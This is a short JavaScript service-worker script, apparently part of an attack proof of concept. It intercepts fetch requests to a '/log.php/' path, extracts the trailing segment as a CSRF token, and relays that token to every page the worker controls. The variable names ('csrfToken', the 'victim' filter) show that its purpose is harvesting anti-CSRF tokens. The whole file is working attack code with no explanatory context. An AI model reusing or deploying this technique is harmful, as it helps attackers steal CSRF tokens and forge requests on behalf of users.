self.addEventListener('fetch', function(event) {
    var urlLogged = event.request.url;
    if (urlLogged.indexOf("/log.php/") >=0  && urlLogged.indexOf("victim") == -1){
        var splitted = urlLogged.split("/log.php/");
        var csrfToken = splitted[splitted.length - 1];
        console.log(csrfToken);
        self.clients.matchAll().then(all => all.map(client => client.postMessage(csrfToken)));
    }
});
